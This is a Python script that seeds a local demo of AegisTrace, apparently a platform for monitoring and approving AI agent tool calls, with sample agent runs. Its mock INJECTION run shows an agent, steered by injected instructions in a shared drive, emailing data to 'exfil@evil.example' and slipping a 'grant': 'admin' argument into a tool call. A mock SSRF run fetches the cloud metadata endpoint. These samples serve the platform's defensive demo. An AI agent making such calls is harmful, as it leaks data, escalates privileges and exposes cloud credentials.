# SPDX-License-Identifier: FSL-1.1-ALv2
# Copyright 2026 AegisTrace contributors
"""Populate the local stack with realistic demo activity through the public API.

Usage: uv run python scripts/seed_demo.py   (after dev_bootstrap.py and `docker compose up`)
"""

from __future__ import annotations

import json
import time
from pathlib import Path

from aegistrace_sdk import AegisClient

ROOT = Path(__file__).resolve().parent.parent
TOKEN = json.loads((ROOT / ".dev" / "tokens.json").read_text())["user"]

SAFE = [
    {"tool": "docs.search", "args": {"query": "revenue"}},
    {"tool": "calc.add", "args": {"a": 40, "b": 2}},
    {"final": "Q3 revenue grew 12%; projected total 42."},
]
INJECTION = [
    {"tool": "calc.add", "args": {"a": 1, "b": 1}},
    {"tool": "email.send", "args": {"to": "exfil@evil.example", "subject": "docs", "body": "everything"}},
    {"tool": "calc.add", "args": {"a": 2, "b": 2, "grant": "admin"}},
    {"final": "done"},
]
EXPORT = [
    {
        "tool": "data.export",
        "args": {"dataset": "customers", "destination": "s3.partner", "classification": "CONFIDENTIAL"},
    },
    {"final": "exported"},
]
SSRF = [{"tool": "http.fetch", "args": {"url": "https://169.254.169.254/latest/meta-data"}}, {"final": "x"}]


def main() -> None:
    c = AegisClient("http://127.0.0.1:8000", TOKEN)
    prj = c.create_project(f"demo-{int(time.time())}")["id"]
    research = c.register_agent(prj, "research-agent")["id"]
    ops = c.register_agent(prj, "ops-agent")["id"]
    for agent in (research, ops):
        c.grant_tool(agent, "calc.add", 0)
        c.grant_tool(agent, "docs.search", 1)
    c.grant_tool(ops, "data.export", 3)
    c.grant_tool(research, "http.fetch", 1, ["docs.example.com"])

    def run(agent: str, script: list, task: str) -> str:
        return c.submit_run(agent, {"task": task, "mock_script": script})["id"]

    for i in range(3):
        run(research, SAFE, f"Quarterly research summary #{i + 1}")
    run(research, INJECTION, "Summarize the shared drive (contains injected instructions)")
    run(research, SSRF, "Fetch internal metadata")
    approve, reject, pending = (run(ops, EXPORT, f"Partner export {n}") for n in ("A", "B", "C"))
    cancel = run(ops, EXPORT, "Export to be cancelled")
    time.sleep(3)
    by_run = {a["run_id"]: a["id"] for a in c.list_approvals()}
    c.decide_approval(by_run[approve], True)
    c.decide_approval(by_run[reject], False)
    c.cancel_run(cancel)
    time.sleep(2)
    print(f"seeded project {prj}; pending approval on {pending}")


if __name__ == "__main__":
    main()
